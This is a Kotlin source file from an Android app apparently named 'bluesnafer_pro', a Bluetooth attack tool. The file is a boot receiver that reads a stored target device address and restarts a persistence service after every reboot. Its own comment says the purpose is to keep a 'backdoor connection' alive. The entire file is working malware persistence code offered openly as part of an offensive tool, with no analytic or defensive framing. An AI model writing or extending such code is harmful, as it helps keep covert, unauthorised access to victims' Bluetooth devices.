package com.bluesnafer_pro

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

/**
 * BroadcastReceiver that listens for BOOT_COMPLETED to restart persistence service.
 * Ensures the backdoor connection is re-established after device reboot.
 */
class BootReceiver : BroadcastReceiver() {
    
    companion object {
        private const val TAG = "BootReceiver"
        private const val PREF_PERSISTENCE_ENABLED = "persistence_enabled"
        private const val PREF_TARGET_DEVICE = "target_device_address"
    }
    
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            Log.d(TAG, "Boot completed received, checking persistence settings...")
            
            val prefs = context.getSharedPreferences("bluesnafer_prefs", Context.MODE_PRIVATE)
            val persistenceEnabled = prefs.getBoolean(PREF_PERSISTENCE_ENABLED, false)
            val targetDevice = prefs.getString(PREF_TARGET_DEVICE, null)
            
            if (persistenceEnabled && targetDevice != null) {
                Log.d(TAG, "Restarting persistence service for device: $targetDevice")
                PersistenceService.startService(context, targetDevice)
            } else {
                Log.d(TAG, "Persistence not enabled or no target device stored")
            }
        }
    }
}
